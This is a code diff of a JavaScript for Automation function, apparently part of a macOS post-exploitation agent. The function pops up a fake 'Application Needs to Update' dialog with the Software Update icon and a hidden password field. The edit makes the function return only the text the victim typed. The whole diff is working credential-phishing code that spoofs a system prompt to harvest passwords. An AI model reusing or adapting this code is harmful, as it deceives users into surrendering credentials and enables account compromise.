@@ -1,7 +1,6 @@
 exports.prompt = function(task, command, params){
 	if(params.length > 0){var config = JSON.parse(params);}
 	else{var config = [];}
-	var config = JSON.parse(params);
 	var title = "Application Needs to Update";
 	if(config.hasOwnProperty("title") && config['title'] != ""){title = config['title'];}
 	var icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
@@ -20,13 +19,8 @@ exports.prompt = function(task, command, params){
 			withIcon: Path(icon),
 			hiddenAnswer: true 
 		});
-		return "clicked: " + prompt.buttonReturned + " with text:" + prompt.textReturned;
+		return prompt.textReturned;
 	}catch(error){
-		if(error.toString() === "Error: User canceled."){
-			return "User canceled prompt";
-		}
-		else{
-			return error.toString();
-		}
+        return error.toString();
 	}
 };
